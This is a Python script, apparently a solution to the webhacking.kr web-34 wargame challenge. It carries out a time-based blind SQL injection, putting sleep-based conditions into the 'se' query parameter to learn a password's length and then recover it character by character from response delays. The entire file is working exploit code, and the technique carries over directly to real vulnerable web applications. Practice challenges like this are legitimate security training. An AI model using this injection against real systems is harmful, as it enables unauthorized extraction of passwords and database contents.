import requests
import string
import time

url="https://webhacking.kr/challenge/web-34/index.php"
cookies={"PHPSESSID":"your session"}
ascii_code=string.digits+string.ascii_letters+string.punctuation
utf="utf-8"

def getFlagLength():
    for i in range(1,100):
        print("(+) Start {}".format(i))
        params = "?msg=abcd&se=if(length(pw)={},sleep(3),0)".format(i)
        find_url = url + params
        sendTime=int(time.time())
        response=requests.post(find_url ,cookies=cookies)

        if response.text.find("Done")>0:
            receiveTime=int(time.time())
            print(f"(+) Send Time : {sendTime} / Receive Time : {receiveTime}")

        if receiveTime-sendTime>1:
            print("(+) Flag length is {}".format(i))
            return i

def getFlag(flagLen):
    flag=""
    sendTime=0
    receiveTime=0
    for i in range(1, flagLen+1):
        for chrct in ascii_code:
            params = "?msg=abcd&se=if(substr(pw, {}, 1)={},sleep(3),0)".format(i, hex(ord(chrct)))
            find_url = url + params
            sendTime = int(time.time())
            response = requests.post(find_url, cookies=cookies)

            if response.text.find("Done") > 0:
                receiveTime = int(time.time())

            if (receiveTime - sendTime > 1):
                print("(+) Flag {}th character is {}".format(i, chrct))
                flag += chrct
                break

    print("(+) Flag is {}".format(flag))
    return flag


if __name__=="__main__":
    getFlag(getFlagLength())